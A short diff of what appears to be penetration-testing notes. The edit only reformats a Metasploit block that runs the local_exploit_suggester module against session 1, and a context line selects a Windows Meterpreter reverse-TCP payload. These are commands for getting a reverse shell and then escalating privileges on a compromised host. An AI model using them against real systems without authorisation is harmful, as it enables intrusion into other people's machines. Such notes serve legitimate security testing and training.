@@ -10,9 +10,10 @@ set payload windows/meterpreter/reverse_tcp
 # Metasploit Windows suggester
 ```
 background
-use post/multi/recon/local_exploit_suggester
-run SESSION=1
 
+use post/multi/recon/local_exploit_suggester
+
+run SESSION=1
 ```
 
 
